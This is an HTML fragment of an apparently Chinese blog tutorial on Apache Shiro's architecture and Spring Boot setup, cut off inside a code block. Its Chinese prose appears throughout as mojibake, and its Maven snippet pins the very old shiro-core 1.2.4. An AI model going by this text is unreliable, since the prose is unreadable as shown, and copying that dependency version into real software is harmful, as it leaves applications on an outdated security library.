<li><a href="https://shiro.apache.org/session-management-features.html">Session Manager</a>ï¼šä¼šè¯ç®¡ç†ï¼Œç”¨æˆ·ç™»é™†åå°±æ˜¯ä¸€æ¬¡ä¼šè¯ï¼Œåœ¨æ²¡æœ‰é€€å‡ºä¹‹å‰ï¼Œå®ƒçš„æ‰€æœ‰ä¿¡æ¯éƒ½åœ¨ä¼šè¯ä¸­ã€‚Shiro ä¸­çš„ä¸€åˆ‡ï¼ˆåŒ…æ‹¬ä¼šè¯å’Œä¼šè¯ç®¡ç†çš„æ‰€æœ‰æ–¹é¢ï¼‰éƒ½æ˜¯åŸºäºæ¥å£çš„ï¼Œå¹¶ä½¿ç”¨ POJO å®ç°ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ä»»ä½•ä¸ JavaBeans å…¼å®¹çš„é…ç½®æ ¼å¼ï¼ˆå¦‚ JSONã€YAMLã€Spring XML æˆ–ç±»ä¼¼æœºåˆ¶ï¼‰è½»æ¾é…ç½®æ‰€æœ‰ä¼šè¯ç»„ä»¶ã€‚Session æ”¯æŒç¼“å­˜é›†ç¾¤çš„æ–¹å¼ï¼›è¿˜æ”¯æŒäº‹ä»¶ä¾¦å¬å™¨ï¼Œå…è®¸åœ¨ä¼šè¯çš„ç”Ÿå‘½å‘¨æœŸå†…ä¾¦å¬ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼Œä»¥æ‰§è¡Œç›¸å…³é€»è¾‘ã€‚Shiro Sessions ä¿ç•™å‘èµ·ä¼šè¯çš„ä¸»æœºçš„ IP åœ°å€ï¼Œå› æ­¤å¯ä»¥æ ¹æ®ç”¨æˆ·ä½ç½®æ¥æ‰§è¡Œä¸åŒé€»è¾‘ã€‚Shiro å¯¹ Web æ”¯æŒå®ç°äº† <code>HttpSession</code> ç±»åŠç›¸å…³å…¨éƒ¨ APIã€‚ä¹Ÿå¯ä»¥åœ¨ SSO ä¸­ä½¿ç”¨ã€‚</li>
<li><a href="https://shiro.apache.org/cryptography-features.html">Cryptography</a>ï¼šåŠ å¯†ï¼Œä¿æŠ¤æ•°æ®çš„å®‰å…¨æ€§ï¼›Shiro ä¸“æ³¨äºä½¿ç”¨å…¬ç§é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä»¥åŠå¯¹å¯†ç ç­‰æ•°æ®è¿›è¡Œä¸å¯é€†çš„å“ˆå¸Œã€‚</li>
<li><a href="https://shiro.apache.org/permissions.html">Permissions</a>ï¼šç”¨æˆ·æƒé™ï¼›Shiro å°†æ‰€æœ‰çš„æ“ä½œéƒ½æŠ½è±¡ä¸º Permissionï¼Œå¹¶é»˜è®¤ä½¿ç”¨ <code>Wildcard Permissions</code> æ¥è¿›è¡ŒåŒ¹é…ã€‚Shiro æ”¯æŒå®ä¾‹çº§åˆ«çš„æƒé™æ§åˆ¶æ ¡éªŒï¼Œä¾‹å¦‚<code>domain:action:instance</code>ã€‚</li>
<li><a href="https://shiro.apache.org/caching.html">Caching</a>ï¼šç¼“å­˜ï¼Œä¸ºäº†æé«˜ Shiro åœ¨ä¸šåŠ¡ä¸­çš„æ€§èƒ½è¡¨ç°ã€‚Shiro çš„ç¼“å­˜æ”¯æŒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªå°è£…çš„ APIï¼Œç”±ç”¨æˆ·è‡ªè¡Œé€‰æ‹©åº•å±‚çš„ç¼“å­˜æ–¹å¼ã€‚ç¼“å­˜ä¸­æœ‰ä¸‰ä¸ªé‡è¦çš„æ¥å£ <code>CacheManager</code>/<code>Cache</code>/<code>CacheManagerAware</code> ï¼ŒShiro æä¾›äº†é»˜è®¤çš„ <code>MemoryConstrainedCacheManager</code> ç­‰å®ç°ã€‚</li>
</ul>
<h3 id="shiroä¸»è¦çš„ç±»">shiroä¸»è¦çš„ç±»<a hidden class="anchor" aria-hidden="true" href="#shiroä¸»è¦çš„ç±»">#</a></h3>
<p>Shiro æ¶æ„ä¸­ä¸»è¦æœ‰ä¸‰ä¸ªæ ¸å¿ƒçš„æ¦‚å¿µï¼šSubject, SecurityManager, Realmsã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20210418162523103.png" alt="image-20210418162523103"  />
</p>
<p><strong>Subject</strong>ï¼šä»£è¡¨å½“å‰çš„ç”¨æˆ·</p>
<p><strong>SecurityManager</strong>ï¼šç®¡ç†è€…æ‰€æœ‰çš„ Subject ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸­æè¿°å…¶ä¸º Shiro æ¶æ„çš„æ ¸å¿ƒ</p>
<p><strong>Realms</strong>ï¼šSecurityManagerçš„è®¤è¯å’Œæˆæƒéœ€è¦ä½¿ç”¨Realmï¼ŒRealmè´Ÿè´£è·å–ç”¨æˆ·çš„æƒé™å’Œè§’è‰²ç­‰ä¿¡æ¯ï¼Œå†è¿”å›ç»™SecurityManageræ¥è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨é…ç½® Shiro çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šè‡³å°‘ä¸€ä¸ªRealm æ¥å®ç°è®¤è¯ï¼ˆauthenticationï¼‰å’Œ/æˆ–æˆæƒï¼ˆauthorizationï¼‰</p>
<p>å¯¹äºShiroæ¥è¯´ï¼Œä¸€æ¬¡è®¤è¯åŠæˆæƒçš„æ ¡éªŒæµç¨‹ï¼š</p>
<ol>
<li>åº”ç”¨ç¨‹åºé€šè¿‡è·å–å½“å‰è®¿é—®çš„ Subjectï¼ˆä¹Ÿå°±æ˜¯ç”¨æˆ·ï¼‰ï¼Œå¹¶è°ƒç”¨å…¶ç›¸åº”æ ¡éªŒæ–¹æ³•ï¼›</li>
<li>Subject å°†æ ¡éªŒå§”æ‰˜ç»™ SecurityManager è¿›è¡Œåˆ¤æ–­ï¼›</li>
<li>SecurityManager ä¼šè°ƒç”¨ Realm æ¥è·å–ä¿¡æ¯æ¥åˆ¤æ–­ç”¨æˆ·å¯¹åº”çš„è§’è‰²èƒ½å¦è¿›è¡Œæ“ä½œã€‚</li>
</ol>
<h4 id="securitymanager">SecurityManager<a hidden class="anchor" aria-hidden="true" href="#securitymanager">#</a></h4>
<p><code>org.apache.shiro.mgt.SecurityManager</code> æ˜¯ shiro çš„ä¸€ä¸ªæ ¸å¿ƒæ¥å£ï¼Œæ¥å£è´Ÿè´£äº†ä¸€ä¸ª Subject ä¹Ÿå°±æ˜¯â€œç”¨æˆ·â€çš„å…¨éƒ¨å®‰å…¨æ“ä½œï¼š</p>
<ul>
<li>æ¥å£æœ¬èº«å®šä¹‰äº† <code>createSubject</code>ã€<code>login</code>ã€<code>logout</code> ä¸‰ä¸ªæ–¹æ³•ç”¨æ¥åˆ›å»º Subjectã€ç™»é™†å’Œé€€å‡ºã€‚</li>
<li>æ‰©å±•äº† <code>org.apache.shiro.authc.Authenticator</code> æ¥å£ï¼Œæä¾›äº† <code>authenticate</code> æ–¹æ³•ç”¨æ¥è¿›è¡Œè®¤è¯ã€‚</li>
<li>æ‰©å±•äº† <code>org.apache.shiro.authz.Authorizer</code> æ¥å£ï¼Œæä¾›äº†å¯¹ Permission å’Œ Role çš„æ ¡éªŒæ–¹æ³•ã€‚åŒ…æ‹¬ <code>has/is/check</code> ç›¸å…³å‘½åçš„æ–¹æ³•ã€‚</li>
<li>æ‰©å±•äº† <code>org.apache.shiro.session.mgt.SessionManager</code> æ¥å£ï¼Œæä¾›äº† <code>start</code>ã€<code>getSession</code> æ–¹æ³•ç”¨æ¥åˆ›å»ºå¯è·å–ä¼šè¯ã€‚</li>
</ul>
<p>Shiro ä¸º SecurityManager æä¾›äº†ä¸€ä¸ªåŒ…å«äº†ä¸Šè¿°æ‰€æœ‰åŠŸèƒ½çš„é»˜è®¤å®ç°ç±» <code>org.apache.shiro.mgt.DefaultSecurityManager</code>ï¼Œä¸­é—´ç»§æ‰¿äº†å¾ˆå¤šä¸­é—´ç±»ï¼Œå¹¶é€å±‚å®ç°äº†ç›¸å…³çš„æ–¹æ³•ï¼Œç»§æ‰¿å…³ç³»å¦‚ä¸‹å›¾ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319141748366.png" alt="image-20230319141748366"  />
</p>
<p>DefaultSecurityManager è¿˜æœ‰ä¸€ä¸ªå­ç±»ï¼Œå°±æ˜¯ <code>org.apache.shiro.web.mgt.DefaultWebSecurityManager</code>ï¼Œè¿™ä¸ªç±»åœ¨ shiro-web åŒ…ä¸­ï¼Œæ˜¯ Shiro ä¸º HTTP/SOAP ç­‰ http åè®®è¿æ¥æä¾›çš„å®ç°ç±»ï¼Œè¿™ä¸ªç±»é»˜è®¤åˆ›å»ºé…ç½®äº† <code>org.apache.shiro.web.mgt.CookieRememberMeManager</code> ç”¨æ¥æä¾› RememberMe ç›¸å…³åŠŸèƒ½ã€‚</p>
<blockquote>
<p>æˆ‘ä»¬å¦‚æœä½¿ç”¨<code>spring</code>æˆ–è€…<code>springboot</code>ç­‰æ¡†æ¶è¿›è¡Œæ•´åˆ<code>Shiro</code>çš„æ—¶å€™ï¼Œåœ¨è®¾å®š<code>SecurityManager</code>å¯¹åº”çš„<code>Realm</code>æ—¶ï¼Œéœ€è¦å£°æ˜ä½¿ç”¨çš„ç±»ä¸º:<code>DefaultWebSecurityManager</code>ã€‚</p>
</blockquote>
<h4 id="subject">Subject<a hidden class="anchor" aria-hidden="true" href="#subject">#</a></h4>
<p><code>org.apache.shiro.subject.Subject</code> æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç”¨æ¥è¡¨ç¤ºåœ¨ Shiro ä¸­çš„ä¸€ä¸ªç”¨æˆ·ã€‚å› ä¸ºåœ¨å¤ªå¤šç»„ä»¶ä¸­éƒ½ä½¿ç”¨äº† <code>User</code> çš„æ¦‚å¿µï¼Œæ‰€ä»¥ Shiro æ•…æ„é¿å¼€äº†è¿™ä¸ªå…³é”®å­—ï¼Œä½¿ç”¨äº† <code>Subject</code>ã€‚</p>
<p>Subject æ¥å£åŒæ ·æä¾›äº†è®¤è¯ï¼ˆlogin/logoutï¼‰ã€æˆæƒï¼ˆè®¿é—®æ§åˆ¶ has/is/check æ–¹æ³•ï¼‰ä»¥åŠè·å–ä¼šè¯çš„èƒ½åŠ›ã€‚åœ¨åº”ç”¨ç¨‹åºä¸­å¦‚æœæƒ³è¦è·å–ä¸€ä¸ªå½“å‰çš„ Subjectï¼Œé€šå¸¸ä½¿ç”¨ <code>SecurityUtils.getSubject()</code> æ–¹æ³•å³å¯ã€‚</p>
<p>å®é™…ä¸Šï¼ŒSubject æ¥å£åœ¨ core åŒ…ä¸­çš„å®ç°ç±» <code>org.apache.shiro.subject.support.DelegatingSubject</code> æœ¬è´¨ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ª SecurityManager çš„ä»£ç†ç±»ã€‚</p>
<p>DelegatingSubject ä¸­ä¿å­˜äº†ä¸€ä¸ª transient ä¿®é¥°çš„ SecurityManager æˆå‘˜å˜é‡ï¼Œåœ¨ä½¿ç”¨å…·ä½“çš„æ ¡éªŒæ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šå§”æ‰˜ SecurityManager è¿›è¡Œå¤„ç†ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319142351444.png" alt="image-20230319142351444"  />
</p>
<p>DelegatingSubject ä¸­ä¸ä¼šä¿å­˜å’Œç»´æŒä¸€ä¸ªç”¨æˆ·çš„â€œçŠ¶æ€ï¼ˆè§’è‰²/æƒé™ï¼‰â€ï¼Œæ°æ°ç›¸åï¼Œæ¯æ¬¡å®ƒéƒ½ä¾èµ–äºåº•å±‚çš„å®ç°ç»„ä»¶ SecurityManager è¿›è¡Œæ£€æŸ¥å’Œæ ¡éªŒï¼Œå› æ­¤é€šå¸¸ä¼šè¦æ±‚ SecurityManager çš„å®ç°ç±»æ¥æä¾›ä¸€äº›ç¼“å­˜æœºåˆ¶ã€‚</p>
<h4 id="realm">Realm<a hidden class="anchor" aria-hidden="true" href="#realm">#</a></h4>
<p><code>org.apache.shiro.realm.Realm</code> æ˜¯ Shiro ä¸­çš„ä¸€ä¸ªæ¥å£ï¼ŒShiro é€šè¿‡ Realm æ¥è®¿é—®æŒ‡å®šåº”ç”¨çš„å®‰å…¨å®ä½“â€”â€”ç”¨æˆ·ã€è§’è‰²ã€æƒé™ç­‰ã€‚ä¸€ä¸ª Realm é€šå¸¸ä¸ä¸€ä¸ªæ•°æ®æºæœ‰ 1 å¯¹ 1 çš„å¯¹åº”å…³ç³»ï¼Œå¦‚å…³ç³»å‹æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿæˆ–è€…å…¶ä»–ç±»ä¼¼çš„èµ„æºã€‚</p>
<p>å®é™…ä¸Šï¼Œä¸€ä¸ª<code>Subject</code>æŸ¥è¯¢æ˜¯å¦æƒé™ã€è§’è‰²çš„æ—¶å€™ï¼Œæ˜¯äº¤ä»˜ç»™åº•å±‚çš„<code>SecurityManager</code>ï¼Œè€Œ<code>SecurityManager</code>æ˜¯é€šè¿‡å…¶è®¾å®šçš„<code>Realm</code>ä¸­å®šä¹‰çš„è§„åˆ™ã€æƒé™æ¥å®ç°æˆæƒã€è®¤è¯çš„ã€‚</p>
<p>åœ¨ä½¿ç”¨ä¸­ï¼Œå¼€å‘äººå‘˜é€šå¸¸ä¸ä¼šç›´æ¥å®ç° Realm æ¥å£ï¼Œè€Œæ˜¯å®ç° Shiro æä¾›äº†ä¸€äº›ç›¸å…³åŠŸèƒ½çš„æŠ½è±¡ç±» AuthenticatingRealm/AuthorizingRealmï¼Œæˆ–è€…ä½¿ç”¨é’ˆå¯¹ç‰¹å®šæ•°æ®æºæä¾›çš„å®ç°ç±»å¦‚ JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm ç­‰ç­‰ã€‚ç»§æ‰¿å…³ç³»å¤§æ¦‚å¦‚ä¸‹ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319142900034.png" alt="image-20230319142900034"  />
</p>
<p>è¾ƒå¤šæƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜ä¼šè‡ªè¡Œå®ç° <code>AuthorizingRealm</code> ç±»ï¼Œå¹¶é‡å†™ <code>doGetAuthorizationInfo</code>/<code>doGetAuthenticationInfo</code> æ–¹æ³•æ¥è‡ªè¡Œå®ç°è‡ªèº«çš„è®¤è¯å’Œæˆæƒé€»è¾‘ã€‚</p>
<h3 id="shiroç®€å•ä½¿ç”¨">Shiroç®€å•ä½¿ç”¨<a hidden class="anchor" aria-hidden="true" href="#shiroç®€å•ä½¿ç”¨">#</a></h3>
<p>ä¸ºäº†ç®€åŒ–æ“ä½œçš„æµç¨‹ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥ä½¿ç”¨springbootè¿›è¡Œæ•´åˆ<code>Shiro</code>ã€‚</p>
<p>é€šè¿‡<code>maven</code>å¯¼å…¥ç›¸å…³ä¾èµ–ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.shiro<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>shiro-web<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>1.6.0<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.shiro<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="font-weight:bold">&lt;artifactId&gt;</span>shiro-core<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>     <span style="font-weight:bold">&lt;version&gt;</span>1.2.4<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.shiro<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>shiro-spring<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>1.4.0<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå®šä¹‰æˆ‘ä»¬è‡ªå·±çš„æˆæƒã€è®¤è¯çš„<code>Realm</code>ã€‚</p>
<ul>
<li>è®¤è¯çš„ç”¨æˆ·è´¦æˆ·åä¸º<code>reus09</code>,å¯†ç ä¸º<code>password</code>ã€‚</li>
<li>å¹¶ä¸”å…¶æ‹¥æœ‰ä¸¤ä¸ª<code>Role</code>:<code>admin</code>,<code>user</code>ã€‚</li>
<li><code>admin</code>æ‹¥æœ‰<code>add</code>æƒé™ï¼Œ<code>user</code>æ‹¥æœ‰<code>delete</code>æƒé™ã€‚</li>
</ul>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
